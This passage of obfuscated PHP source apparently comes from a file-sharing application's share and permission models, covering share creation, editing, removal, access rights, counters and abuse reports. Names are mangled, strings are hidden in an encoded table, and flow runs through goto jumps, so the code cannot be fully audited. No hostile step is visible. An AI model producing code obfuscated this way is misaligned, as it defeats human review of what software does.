¨¶¢ÒÍ) { $F² ¨¶¢ÒÍ[$EÁ²İ‹ÇÉ[1663]] = $eˆÒ‚‡áù°[$F² ¨¶¢ÒÍ[$EÁ²İ‹ÇÉ[420]]]; } goto aøšÆº©íĞ; aøšÆº©íĞ: $b§°¬—®·÷ = array($EÁ²İ‹ÇÉ[1668] => $fğİä…ª–, $EÁ²İ‹ÇÉ[1669] => $C´‰À—Ââ§[$EÁ²İ‹ÇÉ[354]]); return $b§°¬—®·÷; goto a×ô¿ïùÆ¨; DŒã‹ôò¿‚: $bî»¢‡°† = array($EÁ²İ‹ÇÉ[393] => SourceModel::TYPE_USER, $EÁ²İ‹ÇÉ[396] => USER_ID); if ($F¦Úç’æˆÀ) { $bî»¢‡°† = array(array($EÁ²İ‹ÇÉ[393] => SourceModel::TYPE_USER, $EÁ²İ‹ÇÉ[396] => USER_ID), array($EÁ²İ‹ÇÉ[393] => SourceModel::TYPE_GROUP, $EÁ²İ‹ÇÉ[396] => array($EÁ²İ‹ÇÉ[7], $F¦Úç’æˆÀ)), $EÁ²İ‹ÇÉ[1665] => $EÁ²İ‹ÇÉ[1639]); } $C´‰À—Ââ§ = Model($EÁ²İ‹ÇÉ[421])->where($bî»¢‡°†)->selectPage($f„á×îİØ™); goto eÍ˜±¹ùÉƒ; a×ô¿ïùÆ¨: } protected function shareAdd($e »ï²¥µ‰, $AŸ§¥‚±×Ò) { $CñÄµ…åñ… =& $_SERVER[İë¬“ÅÒÛ›]; $aã‚ĞØ™é = $this->_addShareData($e »ï²¥µ‰, $AŸ§¥‚±×Ò); if (isset($AŸ§¥‚±×Ò[$CñÄµ…åñ…[1670]]) && count($AŸ§¥‚±×Ò[$CñÄµ…åñ…[1670]]) > 0) { $this->_shareAuthSet($aã‚ĞØ™é, $AŸ§¥‚±×Ò[$CñÄµ…åñ…[1670]]); } $this->shareEventAdd($e »ï²¥µ‰, $AŸ§¥‚±×Ò, $CñÄµ…åñ…[759]); return $aã‚ĞØ™é; } private function shareEventAdd($CÒ·ğîëêÈ, $FÀøÃÌ÷´â, $a¦˜íÖ¯¯ä = "\x61\144\x64") { goto C¹¡‘º°Áª; bÑâ¿¶ØÅ: $B±´ğÊÚ = $f°Ôäà§ƒ­[1673]; if ($c¾ï›¥›Ğ[$f°Ôäà§ƒ­[1664]] == $f°Ôäà§ƒ­[403] && $FÀøÃÌ÷´â[$f°Ôäà§ƒ­[1664]] == $f°Ôäà§ƒ­[377]) { $B±´ğÊÚ = $f°Ôäà§ƒ­[1671]; } if ($c¾ï›¥›Ğ[$f°Ôäà§ƒ­[1664]] == $f°Ôäà§ƒ­[377] && $FÀøÃÌ÷´â[$f°Ôäà§ƒ­[1664]] == $f°Ôäà§ƒ­[403]) { $B±´ğÊÚ = $f°Ôäà§ƒ­[1674]; } goto CºÜ¬¢ğÈÕ; c‰ã‡ßí¤é: return; goto a…ÜÜ‰›‰ª; C¹¡‘º°Áª: $f°Ôäà§ƒ­ =& $_SERVER[İë¬“ÅÒÛ›]; if ($a¦˜íÖ¯¯ä == $f°Ôäà§ƒ­[759]) { if ($FÀøÃÌ÷´â[$f°Ôäà§ƒ­[1664]] == $f°Ôäà§ƒ­[377]) { Model($f°Ôäà§ƒ­[382])->eventShare($CÒ·ğîëêÈ, $f°Ôäà§ƒ­[1671]); } if ($FÀøÃÌ÷´â[$f°Ôäà§ƒ­[418]] == $f°Ôäà§ƒ­[377]) { Model($f°Ôäà§ƒ­[382])->eventShare($CÒ·ğîëêÈ, $f°Ôäà§ƒ­[1672]); } return; } $c¾ï›¥›Ğ = $this->getInfoByPath($CÒ·ğîëêÈ); goto bÑâ¿¶ØÅ; CºÜ¬¢ğÈÕ: if ($c¾ï›¥›Ğ[$f°Ôäà§ƒ­[418]] == $f°Ôäà§ƒ­[403] && $FÀøÃÌ÷´â[$f°Ôäà§ƒ­[418]] == $f°Ôäà§ƒ­[377]) { $B±´ğÊÚ = $f°Ôäà§ƒ­[1672]; } if ($c¾ï›¥›Ğ[$f°Ôäà§ƒ­[418]] == $f°Ôäà§ƒ­[377] && $FÀøÃÌ÷´â[$f°Ôäà§ƒ­[418]] == $f°Ôäà§ƒ­[403]) { $B±´ğÊÚ = $f°Ôäà§ƒ­[1675]; } Model($f°Ôäà§ƒ­[382])->eventShare($CÒ·ğîëêÈ, $B±´ğÊÚ); goto c‰ã‡ßí¤é; a…ÜÜ‰›‰ª: } private function _addShareData($Bß§—ˆ¶öî, $BãÈÀ¨§ç¶ = array()) { goto fí®èš¤Æß; câº™ó”¾: if ($bÍõœ¢”Ù = $this->where($DÖí™¤å”è)->find()) { return $bÍõœ¢”Ù[$C±·Ù™¾°[420]]; } if ($Bß§—ˆ¶öî == 0) { $cù¹ñî†¬ = array($C±·Ù™¾°[28] => get_path_this($BãÈÀ¨§ç¶[$C±·Ù™¾°[76]])); } else { $cù¹ñî†¬ = Model($C±·Ù™¾°[522])->sourceInfo($Bß§—ˆ¶öî); if (!$cù¹ñî†¬) { return !1; } } if (!$BãÈÀ¨§ç¶[$C±·Ù™¾°[1004]]) { $BãÈÀ¨§ç¶[$C±·Ù™¾°[1004]] = $cù¹ñî†¬[$C±·Ù™¾°[28]]; } goto FøÁÈá™‘¥; F´ ÊÂ ÏÕ: $fõïôäê˜Ó = $this->add($c®‡¤±Š); $a±Æ¦ã“¹ã = array($C±·Ù™¾°[1661] => short_id($fõïôäê˜Ó)); $this->where(array($C±·Ù™¾°[1681] => $fõïôäê˜Ó))->save($a±Æ¦ã“¹ã); goto Fù¼Ã°³Ï; FøÁÈá™‘¥: $c®‡¤±Š = array($C±·Ù™¾°[1086] => USER_ID, $C±·Ù™¾°[416] => $Bß§—ˆ¶öî, $C±·Ù™¾°[1004] => $C±·Ù™¾°[33], $C±·Ù™¾°[1664] => 0, $C±·Ù™¾°[418] => 0, $C±·Ù™¾°[767] => $C±·Ù™¾°[33], $C±·Ù™¾°[567] => $C±·Ù™¾°[33], $C±·Ù™¾°[1677] => 0, $C±·Ù™¾°[1678] => 0, $C±·Ù™¾°[461] => 0, $C±·Ù™¾°[1679] => $C±·Ù™¾°[33], $C±·Ù™¾°[1661] => $C±·Ù™¾°[33]); $fëä¶âÏ·ª = explode($C±·Ù™¾°[47], $C±·Ù™¾°[1680]); foreach ($fëä¶âÏ·ª as $c›îÃÜïù÷) { $c®‡¤±Š[$c›îÃÜïù÷] = $BãÈÀ¨§ç¶[$c›îÃÜïù÷]; } goto F´ ÊÂ ÏÕ; Fù¼Ã°³Ï: return $fõïôäê˜Ó; goto b£î‡Î”âĞ; fí®èš¤Æß: $C±·Ù™¾° =& $_SERVER[İë¬“ÅÒÛ›]; $DÖí™¤å”è = array($C±·Ù™¾°[416] => $Bß§—ˆ¶öî, $C±·Ù™¾°[1086] => USER_ID); if ($Bß§—ˆ¶öî == 0) { $DÖí™¤å”è = array($C±·Ù™¾°[1676] => $BãÈÀ¨§ç¶[$C±·Ù™¾°[767]], $C±·Ù™¾°[1086] => USER_ID); } goto câº™ó”¾; b£î‡Î”âĞ: } private function _shareAuthSet($dè¯“ õßõ, $A¦‘ÍÙ±„) { goto fÈ‰âÓ–¿Ğ; cÄ§ìå‰×ø: return $A†í¾â—Ó°->addAll($A’Äã¹ìŞ², array(), !0); goto c¢‹Ì¾¢Ş‚; bÃÛ£º÷Ç…: $A†í¾â—Ó°->where(array($FÜ…îÃ¸[420] => $dè¯“ õßõ))->delete(); $A’Äã¹ìŞ² = array(); foreach ($A¦‘ÍÙ±„ as $e¦îÙ‚ÉÒæ) { $cÂ•Éßƒ¯° = SourceModel::TYPE_USER; if ($e¦îÙ‚ÉÒæ[$FÜ…îÃ¸[394]] == SourceModel::TYPE_GROUP) { $cÂ•Éßƒ¯° = SourceModel::TYPE_GROUP; } $Bô‘ÙÚÊÄ‚ = array($FÜ…îÃ¸[420] => $dè¯“ õßõ, $FÜ…îÃ¸[394] => $cÂ•Éßƒ¯°, $FÜ…îÃ¸[396] => intval($e¦îÙ‚ÉÒæ[$FÜ…îÃ¸[396]]), $FÜ…îÃ¸[1683] => 0, $FÜ…îÃ¸[1684] => -1); if ($e¦îÙ‚ÉÒæ[$FÜ…îÃ¸[1683]]) { $Bô‘ÙÚÊÄ‚[$FÜ…îÃ¸[1683]] = $e¦îÙ‚ÉÒæ[$FÜ…îÃ¸[1683]]; } else { if ($e¦îÙ‚ÉÒæ[$FÜ…îÃ¸[1684]]) { $Bô‘ÙÚÊÄ‚[$FÜ…îÃ¸[1684]] = $e¦îÙ‚ÉÒæ[$FÜ…îÃ¸[1684]]; } } $A’Äã¹ìŞ²[] = $Bô‘ÙÚÊÄ‚; } goto cÄ§ìå‰×ø; fÈ‰âÓ–¿Ğ: $FÜ…îÃ¸ =& $_SERVER[İë¬“ÅÒÛ›]; if (!is_array($A¦‘ÍÙ±„)) { return !1; } $A†í¾â—Ó° = Model($FÜ…îÃ¸[1682]); goto bÃÛ£º÷Ç…; c¢‹Ì¾¢Ş‚: } public function numViewAdd($bí¤›êğù”) { $F‰Æ›§Ó» =& $_SERVER[İë¬“ÅÒÛ›]; $cœ‘Ó¥öÊ = array($F‰Æ›§Ó»[1681] => $bí¤›êğù”); $this->where($cœ‘Ó¥öÊ)->setAdd($F‰Æ›§Ó»[1677]); } public function numDownloadAdd($b Ò™¤¼º¾) { $cè ­æ¤ğ =& $_SERVER[İë¬“ÅÒÛ›]; $E—Ï¨ªçö³ = array($cè ­æ¤ğ[1681] => $b Ò™¤¼º¾); $this->where($E—Ï¨ªçö³)->setAdd($cè ­æ¤ğ[1678]); } protected function shareEdit($C’—ÜŸˆÊ‹, $D”Û×Åñ÷ˆ) { goto c•ĞÉìÆÄƒ; c–Œ¯î“ºã: $this->_checkLinkShare($D”Û×Åñ÷ˆ, $bç„ŸÂÜÀØ); $Dƒ—‹—Ûëä = array(); $C±Á±¾‡Áµ = explode($C•ÃÆÎóŠÖ[47], $C•ÃÆÎóŠÖ[1685]); goto Fí‚ñÏÒŠŒ; c•ĞÉìÆÄƒ: $C•ÃÆÎóŠÖ =& $_SERVER[İë¬“ÅÒÛ›]; $bç„ŸÂÜÀØ = $this->getInfo($C’—ÜŸˆÊ‹); if (!$bç„ŸÂÜÀØ) { return !1; } goto c–Œ¯î“ºã; Fí‚ñÏÒŠŒ: foreach ($C±Á±¾‡Áµ as $aÚïí½è‡¥) { if (!array_key_exists($aÚïí½è‡¥, $D”Û×Åñ÷ˆ)) { continue; } $Dƒ—‹—Ûëä[$aÚïí½è‡¥] = $D”Û×Åñ÷ˆ[$aÚïí½è‡¥]; } $this->shareEventAdd($bç„ŸÂÜÀØ[$C•ÃÆÎóŠÖ[375]], $D”Û×Åñ÷ˆ, $C•ÃÆÎóŠÖ[1515]); $this->where(array($C•ÃÆÎóŠÖ[1681] => $C’—ÜŸˆÊ‹))->save($Dƒ—‹—Ûëä); goto dáŸÙÛÅ²; dáŸÙÛÅ²: if (isset($D”Û×Åñ÷ˆ[$C•ÃÆÎóŠÖ[1670]])) { $this->_shareAuthSet($C’—ÜŸˆÊ‹, $D”Û×Åñ÷ˆ[$C•ÃÆÎóŠÖ[1670]]); } return !0; goto DÆä˜óâá; DÆä˜óâá: } private function _checkLinkShare($Báê¨••¡å, $Bˆˆ¬ŒÕ ª) { $dŒáÇËË°– =& $_SERVER[İë¬“ÅÒÛ›]; if ($Báê¨••¡å[$dŒáÇËË°–[1664]] != $dŒáÇËË°–[377] || $Bˆˆ¬ŒÕ ª[$dŒáÇËË°–[861]][$dŒáÇËË°–[29]] != $dŒáÇËË°–[164]) { return; } $Cé‰Ò‹ = Model($dŒáÇËË°–[522])->fileInfoGet($Bˆˆ¬ŒÕ ª[$dŒáÇËË°–[861]][$dŒáÇËË°–[375]]); if (!$Cé‰Ò‹) { return; } $dÍŸˆŒìŒ = $this->shareFileMeta($Cé‰Ò‹[$dŒáÇËË°–[383]]); if (isset($dÍŸˆŒìŒ[$dŒáÇËË°–[360]]) && $dÍŸˆŒìŒ[$dŒáÇËË°–[360]] == $dŒáÇËË°–[377]) { show_json(LNG($dŒáÇËË°–[1686]), !1); } } protected function remove($dºÁ±Ÿ·ğŠ) { goto Dãàˆ¦…”±; añÃ¶›´©: $cÙ…áÌÀ´Ş = $this->where($Bò°åŸÕÄ°)->delete(); if ($cÙ…áÌÀ´Ş) { Model($d’İ³ÎÅœÅ[421])->where(array($d’İ³ÎÅœÅ[420] => $dºÁ±Ÿ·ğŠ))->delete(); } $Cù†×äÜ„µ = is_array($dºÁ±Ÿ·ğŠ) ? $dºÁ±Ÿ·ğŠ[1] : array($dºÁ±Ÿ·ğŠ); goto CËµ´¾ˆÖì; CËµ´¾ˆÖì: for ($bôÔÅÌ‚İø = 0; $bôÔÅÌ‚İø < count($Cù†×äÜ„µ); $bôÔÅÌ‚İø++) { $A¾™å£±µ = $this->getInfo($Cù†×äÜ„µ[$bôÔÅÌ‚İø]); if ($A¾™å£±µ[$d’İ³ÎÅœÅ[418]] == $d’İ³ÎÅœÅ[377]) { Model($d’İ³ÎÅœÅ[382])->eventShare($A¾™å£±µ[$d’İ³ÎÅœÅ[375]], $d’İ³ÎÅœÅ[1675]); } if ($A¾™å£±µ[$d’İ³ÎÅœÅ[1664]] == $d’İ³ÎÅœÅ[377]) { Model($d’İ³ÎÅœÅ[382])->eventShare($A¾™å£±µ[$d’İ³ÎÅœÅ[375]], $d’İ³ÎÅœÅ[1674]); } } return $cÙ…áÌÀ´Ş; goto B‡Ğ¯¯º›â; Dãàˆ¦…”±: $d’İ³ÎÅœÅ =& $_SERVER[İë¬“ÅÒÛ›]; if (is_array($dºÁ±Ÿ·ğŠ)) { $dºÁ±Ÿ·ğŠ = array($d’İ³ÎÅœÅ[7], $dºÁ±Ÿ·ğŠ); } $Bò°åŸÕÄ° = array($d’İ³ÎÅœÅ[420] => $dºÁ±Ÿ·ğŠ); goto añÃ¶›´©; B‡Ğ¯¯º›â: } protected function removeBySource($EÁ¶êˆê‡) { goto C›‘‘»ˆš¾; b‰‚Ü½¹Š: $this->where($dŠ²“™ğÏ•)->delete(); Model($a¢£ƒö˜¦[421])->where($dŠ²“™ğÏ•)->delete(); goto C‘§Éô½©; C›‘‘»ˆš¾: $a¢£ƒö˜¦ =& $_SERVER[İë¬“ÅÒÛ›]; $dŠ²“™ğÏ• = array($a¢£ƒö˜¦[416] => array($a¢£ƒö˜¦[983], $EÁ¶êˆê‡)); $F•¥ç¥§ Û = $this->field($a¢£ƒö˜¦[420])->where($dŠ²“™ğÏ•)->select(); goto eœ†ƒ‘Û¯–; eœ†ƒ‘Û¯–: $F•¥ç¥§ Û = array_to_keyvalue($F•¥ç¥§ Û, $a¢£ƒö˜¦[33], $a¢£ƒö˜¦[420]); if (!$F•¥ç¥§ Û) { return; } $dŠ²“™ğÏ• = array($a¢£ƒö˜¦[1681] => array($a¢£ƒö˜¦[983], $F•¥ç¥§ Û)); goto b‰‚Ü½¹Š; C‘§Éô½©: } public function listAll($B†¨ÒÀöË°) { goto AöôÉ¨Ÿ; dëÑ‹Ÿ¥: if ($B†¨ÒÀöË°[$cŠŞŠ¡ˆê£[460]]) { $bÃäÂ©ğ—À = $B†¨ÒÀöË°[$cŠŞŠ¡ˆê£[461]] ? $B†¨ÒÀöË°[$cŠŞŠ¡ˆê£[461]] : strtotime(date($cŠŞŠ¡ˆê£[1687])); $b“Ø«Õœ­ß[$cŠŞŠ¡ˆê£[187]] = array($cŠŞŠ¡ˆê£[325], array($B†¨ÒÀöË°[$cŠŞŠ¡ˆê£[460]], $bÃäÂ©ğ—À)); } if ($B†¨ÒÀöË°[$cŠŞŠ¡ˆê£[29]]) { $b“Ø«Õœ­ß[$B†¨ÒÀöË°[$cŠŞŠ¡ˆê£[29]]] = 1; } else { $b“Ø«Õœ­ß[] = array($cŠŞŠ¡ˆê£[1664] => array($cŠŞŠ¡ˆê£[696], 0), $cŠŞŠ¡ˆê£[418] => array($cŠŞŠ¡ˆê£[696], 0), $cŠŞŠ¡ˆê£[1665] => $cŠŞŠ¡ˆê£[1639]); } if ($B†¨ÒÀöË°[$cŠŞŠ¡ˆê£[1635]]) { $b“Ø«Õœ­ß[] = array($cŠŞŠ¡ˆê£[1661] => $B†¨ÒÀöË°[$cŠŞŠ¡ˆê£[1635]], $cŠŞŠ¡ˆê£[1004] => array($cŠŞŠ¡ˆê£[521], "\45{$B†¨ÒÀöË°[$cŠŞŠ¡ˆê£[1635]]}\45"), $cŠŞŠ¡ˆê£[1665] => $cŠŞŠ¡ˆê£[1639]); } goto E¢‰†ÀĞ†ñ; E¢‰†ÀĞ†ñ: $D‡– °õ¬¤ = $this->_makeOrder()->where($b“Ø«Õœ­ß)->selectPage(20); if (empty($D‡– °õ¬¤[$cŠŞŠ¡ˆê£[357]])) { return array(); } $this->_listDataApply($D‡– °õ¬¤[$cŠŞŠ¡ˆê£[357]]); goto F£áØœÈà¯; AöôÉ¨Ÿ: $cŠŞŠ¡ˆê£ =& $_SERVER[İë¬“ÅÒÛ›]; $b“Ø«Õœ­ß = array(); if ($B†¨ÒÀöË°[$cŠŞŠ¡ˆê£[1095]]) { $b“Ø«Õœ­ß[$cŠŞŠ¡ˆê£[1095]] = $B†¨ÒÀöË°[$cŠŞŠ¡ˆê£[1095]]; } goto dëÑ‹Ÿ¥; F£áØœÈà¯: return $D‡– °õ¬¤; goto bŠ„Ä˜²ñ; bŠ„Ä˜²ñ: } private function _listDataApply(&$d«¹ğ§É”ê) { $a„å—³œéÔ =& $_SERVER[İë¬“ÅÒÛ›]; $c²Ø‘²é… = array_to_keyvalue($d«¹ğ§É”ê, $a„å—³œéÔ[33], $a„å—³œéÔ[1095]); $bÈôâ¡ŠÉÙ = Model($a„å—³œéÔ[1481])->userListInfo(array_unique($c²Ø‘²é…)); $bÙÈ¼İ¤¨ = array_to_keyvalue($d«¹ğ§É”ê, $a„å—³œéÔ[33], $a„å—³œéÔ[375]); $C£Ï ³ÀÊĞ = Model($a„å—³œéÔ[522])->sourceListInfo($bÙÈ¼İ¤¨, !0); foreach ($d«¹ğ§É”ê as &$c·‘¬ä ±) { $bà¶²ÎŠ®ò = $c·‘¬ä ±[$a„å—³œéÔ[1095]]; $c·‘¬ä ±[$a„å—³œéÔ[1688]] = $bÈôâ¡ŠÉÙ[$bà¶²ÎŠ®ò] ? $bÈôâ¡ŠÉÙ[$bà¶²ÎŠ®ò] : !1; $a„ÆÈĞ•ç¸ = $c·‘¬ä ±[$a„å—³œéÔ[375]]; $c·‘¬ä ±[$a„å—³œéÔ[861]] = $C£Ï ³ÀÊĞ[$a„ÆÈĞ•ç¸] ? $C£Ï ³ÀÊĞ[$a„ÆÈĞ•ç¸] : !1; } } private function _makeOrder($a†…¾˜†® = '') { goto fÄ©Œ¤Ù; fÄ©Œ¤Ù: $F‰÷£óòÊ“ =& $_SERVER[İë¬“ÅÒÛ›]; $bŸŠ”ÇïæÈ = array($F‰÷£óòÊ“[187], $F‰÷£óòÊ“[461], $F‰÷£óòÊ“[1677], $F‰÷£óòÊ“[1678]); $cÎÙ´’Óëé = array($F‰÷£óòÊ“[1632] => $F‰÷£óòÊ“[1633], $F‰÷£óòÊ“[1513] => $F‰÷£óòÊ“[1590]); goto d½ÖÛ«Éªô; dÎõğ›ËÏ: $a†…¾˜†® = $a†…¾˜†® . "{$Eğ÷Š¤ÒÛ„}\x20{$f¨İÖ³ˆí¡}"; return $this->order($a†…¾˜†®); goto fó¹ê“š¡œ; d½ÖÛ«Éªô: $Eğ÷Š¤ÒÛ„ = Input::get($F‰÷£óòÊ“[1586], $F‰÷£óòÊ“[7], $F‰÷£óòÊ“[1587], $bŸŠ”ÇïæÈ); $f¨İÖ³ˆí¡ = Input::get($F‰÷£óòÊ“[1588], $F‰÷£óòÊ“[7], $F‰÷£óòÊ“[1689], array($F‰÷£óòÊ“[1634], $F‰÷£óòÊ“[1513])); $f¨İÖ³ˆí¡ = $cÎÙ´’Óëé[$f¨İÖ³ˆí¡]; goto dÎõğ›ËÏ; fó¹ê“š¡œ: } public function reportAdd($FíĞ–‡‹) { $AÏØ¿Ç½”Ø =& $_SERVER[İë¬“ÅÒÛ›]; $DÁèŞé¦À‡ = array($AÏØ¿Ç½”Ø[420] => $FíĞ–‡‹[$AÏØ¿Ç½”Ø[420]], $AÏØ¿Ç½”Ø[1095] => USER_ID); if (Model($AÏØ¿Ç½”Ø[1690])->where($DÁèŞé¦À‡)->find()) { return !1; } $DŒ•ƒ³â = array($AÏØ¿Ç½”Ø[420] => $FíĞ–‡‹[$AÏØ¿Ç½”Ø[420]], $AÏØ¿Ç½”Ø[1004] => $FíĞ–‡‹[$AÏØ¿Ç½”Ø[1004]], $AÏØ¿Ç½”Ø[375] => $FíĞ–‡‹[$AÏØ¿Ç½”Ø[375]], $AÏØ¿Ç½”Ø[383] => $FíĞ–‡‹[$AÏØ¿Ç½”Ø[383]], $AÏØ¿Ç½”Ø[1095] => USER_ID, $AÏØ¿Ç½”Ø[29] => $FíĞ–‡‹[$AÏØ¿Ç½”Ø[29]], $AÏØ¿Ç½”Ø[1590] => $FíĞ–‡‹[$AÏØ¿Ç½”Ø[1590]]); return Model($AÏØ¿Ç½”Ø[1690])->add($DŒ•ƒ³â); } public function reportList($cŠ¬ñ¥£·”) { goto dÑ©¢ ¹˜ô; dÑ©¢ ¹˜ô: $dÚ‹¬œİ×‚ =& $_SERVER[İë¬“ÅÒÛ›]; $EÀ¯¦÷Î¹Ñ = array(); if ($cŠ¬ñ¥£·”[$dÚ‹¬œİ×‚[460]]) { $C¥¦ƒØÂîÏ = $cŠ¬ñ¥£·”[$dÚ‹¬œİ×‚[461]] ? $cŠ¬ñ¥£·”[$dÚ‹¬œİ×‚[461]] : strtotime(date($dÚ‹¬œİ×‚[1687])); $EÀ¯¦÷Î¹Ñ[$dÚ‹¬œİ×‚[187]] = array($dÚ‹¬œİ×‚[325], array($cŠ¬ñ¥£·”[$dÚ‹¬œİ×‚[460]], $C¥¦ƒØÂîÏ)); } goto f™³Ô¯­‰Â; DÌ—ìªÖÙè: $a•Ü‡ïÎÈª = array($dÚ‹¬œİ×‚[1632] => $dÚ‹¬œİ×‚[1633], $dÚ‹¬œİ×‚[1513] => $dÚ‹¬œİ×‚[1590]); $eŞ³©°ò›‹ = $dÚ‹¬œİ×‚[1694] . $a•Ü‡ïÎÈª[$f¤ÛÈ¼Ì]; $CùŞô¡ªñÜ = Model($dÚ‹¬œİ×‚[1690])->where($EÀ¯¦÷Î¹Ñ)->order($eŞ³©°ò›‹)->selectPage(20); goto A»ËµªåĞ; A»ËµªåĞ: if (empty($CùŞô¡ªñÜ[$dÚ‹¬œİ×‚[357]])) { return array(); } $this->_listDataApply($CùŞô¡ªñÜ[$dÚ‹¬œİ×‚[357]]); return $CùŞô¡ªñÜ; goto f¥ ¼í»¢Ø; f™³Ô¯­‰Â: if (isset($cŠ¬ñ¥£·”[$dÚ‹¬œİ×‚[29]]) && in_array($cŠ¬ñ¥£·”[$dÚ‹¬œİ×‚[29]], array($dÚ‹¬œİ×‚[377], $dÚ‹¬œİ×‚[1691], $dÚ‹¬œİ×‚[1692], $dÚ‹¬œİ×‚[1693], $dÚ‹¬œİ×‚[1349]))) { $EÀ¯¦÷Î¹Ñ[$dÚ‹¬œİ×‚[29]] = $cŠ¬ñ¥£·”[$dÚ‹¬œİ×‚[29]]; } if (isset($cŠ¬ñ¥£·”[$dÚ‹¬œİ×‚[447]]) && in_array($cŠ¬ñ¥£·”[$dÚ‹¬œİ×‚[447]], array($dÚ‹¬œİ×‚[403], $dÚ‹¬œİ×‚[377], $dÚ‹¬œİ×‚[1691], $dÚ‹¬œİ×‚[1692]))) { $EÀ¯¦÷Î¹Ñ[$dÚ‹¬œİ×‚[447]] = $cŠ¬ñ¥£·”[$dÚ‹¬œİ×‚[447]]; } $f¤ÛÈ¼Ì = Input::get($dÚ‹¬œİ×‚[1588], $dÚ‹¬œİ×‚[7], $dÚ‹¬œİ×‚[1689], array($dÚ‹¬œİ×‚[1634], $dÚ‹¬œİ×‚[1513])); goto DÌ—ìªÖÙè; f¥ ¼í»¢Ø: } public function reportStatus($AØÁÇ¥áš¯) { goto a¢ßëÂ ƒ¹; a¢ßëÂ ƒ¹: $CµÍ­•É¿‚ =& $_SERVER[İë¬“ÅÒÛ›]; $E©ï¡Æ¢ğ = array($CµÍ­•É¿‚[369] => $AØÁÇ¥áš¯[$CµÍ­•É¿‚[369]]); $Fäé‡¢‚ê´ = Model($CµÍ­•É¿‚[1690])->where($E©ï¡Æ¢ğ)->field($CµÍ­•É¿‚[1695])->find(); goto dó°è‰š¥Î; bÆÔÃÁ÷Ó: return $EÃæ»Œ„ç÷; goto dÏŒéØÊ©š; B‡”œ§§ïÖ: $EÃæ»Œ„ç÷ = Model($CµÍ­•É¿‚[1690])->where($E©ï¡Æ¢ğ)->save($B‡±ˆ‰¿ˆÃ); if ($AØÁÇ¥áš¯[$CµÍ­•É¿‚[447]] == $CµÍ­•É¿‚[1691]) { if ($Fäé‡¢‚ê´[$CµÍ­•É¿‚[383]] != $CµÍ­•É¿‚[403] && $this->shareFileMeta($Fäé‡¢‚ê´[$CµÍ­•É¿‚[383]])) { $this->shareFileMeta($Fäé‡¢‚ê´[$CµÍ­•É¿‚[383]], 0); } return $this->remove($Fäé‡¢‚ê´[$CµÍ­•É¿‚[420]]); } if ($EÃæ»Œ„ç÷ && $AØÁÇ¥áš¯[$CµÍ­•É¿‚[447]] == $CµÍ­•É¿‚[1692]) { $bµçŒ’ªÌÔ = $B‡±ˆ‰¿ˆÃ[$CµÍ­•É¿‚[447]] == $CµÍ­•É¿‚[1692] ? 1 : 0; $this->shareFileMeta($Fäé‡¢‚ê´[$CµÍ­•É¿‚[383]], $bµçŒ’ªÌÔ); $this->removeByFile($Fäé‡¢‚ê´[$CµÍ­•É¿‚[383]]); } goto bÆÔÃÁ÷Ó; dó°è‰š¥Î: if (!$Fäé‡¢‚ê´) { return !1; } $B‡±ˆ‰¿ˆÃ = array($CµÍ­•É¿‚[447] => $AØÁÇ¥áš¯[$CµÍ­•É¿‚[447]]); if ($AØÁÇ¥áš¯[$CµÍ­•É¿‚[447]] == $CµÍ­•É¿‚[1692] && $Fäé‡¢‚ê´[$CµÍ­•É¿‚[447]] == $CµÍ­•É¿‚[1692]) { $B‡±ˆ‰¿ˆÃ[$CµÍ­•É¿‚[447]] = 0; } goto B‡”œ§§ïÖ; dÏŒéØÊ©š: } private function removeByFile($F™„å‰îÈ½) { goto AÏÇç‹–±; dóì¹º¦ñ¤: $this->remove($d½ƒÍùö„˜); goto BÄ¢‰äÖˆÉ; d»Ù„ÚŒ¾: $EÖ«ßîŠ˜Š = array($BëÓ¼‘˜Ø[375] => array($BëÓ¼‘˜Ø[7], $Cæá—ŠÀˆ), $BëÓ¼‘˜Ø[1664] => 1); $EñèÊÂÊÜ± = Model($BëÓ¼‘˜Ø[1523])->where($EÖ«ßîŠ˜Š)->field($BëÓ¼‘˜Ø[420])->select(); $d½ƒÍùö„˜ = array_to_keyvalue($EñèÊÂÊÜ±, $BëÓ¼‘˜Ø[33], $BëÓ¼‘˜Ø[420]); goto dóì¹º¦ñ¤; AÏÇç‹–±: $BëÓ¼‘˜Ø =& $_SERVER[İë¬“ÅÒÛ›]; $EñèÊÂÊÜ± = Model($BëÓ¼‘˜Ø[522])->where(array($BëÓ¼‘˜Ø[383] => $F™„å‰îÈ½))->field($BëÓ¼‘˜Ø[375])->select(); $Cæá—ŠÀˆ = array_to_keyvalue($EñèÊÂÊÜ±, $BëÓ¼‘˜Ø[33], $BëÓ¼‘˜Ø[375]); goto d»Ù„ÚŒ¾; BÄ¢‰äÖˆÉ: } private function shareFileMeta($c­Â–¦ß“, $C¢¤ÉÙµ•Ø = null) { $cÏ»ß“îİ” =& $_SERVER[İë¬“ÅÒÛ›]; $C°°éó©… = array($cÏ»ß“îİ”[383] => $c­Â–¦ß“, $cÏ»ß“îİ”[88] => $cÏ»ß“îİ”[1696]); if (is_null($C¢¤ÉÙµ•Ø)) { return Model($cÏ»ß“îİ”[1697])->where($C°°éó©…)->find(); } $C°°éó©…[$cÏ»ß“îİ”[360]] = $C¢¤ÉÙµ•Ø; Model($cÏ»ß“îİ”[1697])->add($C°°éó©…, array(), !0); } } class SourceAuthModel extends ModelBase { protected $tableName = "\151\157\137\163\x6f\165\162\x63\145\x5f\141\165\x74\x68"; public function getAuth($a´Ÿ¯„‹§Å) { goto D‚Æô¾µÍ»; c†—§ïõóÃ: $b…É……­Ë­ = $this->field($B•ÂÓˆ±Õç)->order($Bóß„ËäËõ[369])->where($fç×ôˆÊÛ)->select(); $c¥¬Ğ‰Õ†Ä = array(); foreach ($b…É……­Ë­ as $Aº¼˜öÏÒ) { if (Model($Bóß„ËäËõ[1699])->listData($Aº¼˜öÏÒ[$Bóß„ËäËõ[1683]])) { $c¥¬Ğ‰Õ†Ä[] = $Aº¼˜öÏÒ; } } goto D†Ú×ÃÒß; D‚Æô¾µÍ»: $Bóß„ËäËõ =& $_SERVER[İë¬“ÅÒÛ›]; $B•ÂÓˆ±Õç = $Bóß„ËäËõ[1698]; $fç×ôˆÊÛ = array($Bóß„ËäËõ[375] => $a´Ÿ¯„‹§Å); goto c†—§ïõóÃ; D†Ú×ÃÒß: return $c¥¬Ğ‰Õ†Ä; goto f… ÎÈ©î¼; f… ÎÈ©î¼: } public function setAuth($b³¹¨àĞ„, $D¯ ä§àÔ) { goto eºò¹˜äÓ; cò”ÌùšÚÊ: $a­óğİØ¯° = array(SourceModel::TYPE_GROUP, SourceModel::TYPE_USER); $d¾Æ‡“Ä¶‹ = array(); foreach ($D¯ ä§àÔ as $DóéëÏ‚Õõ) { if 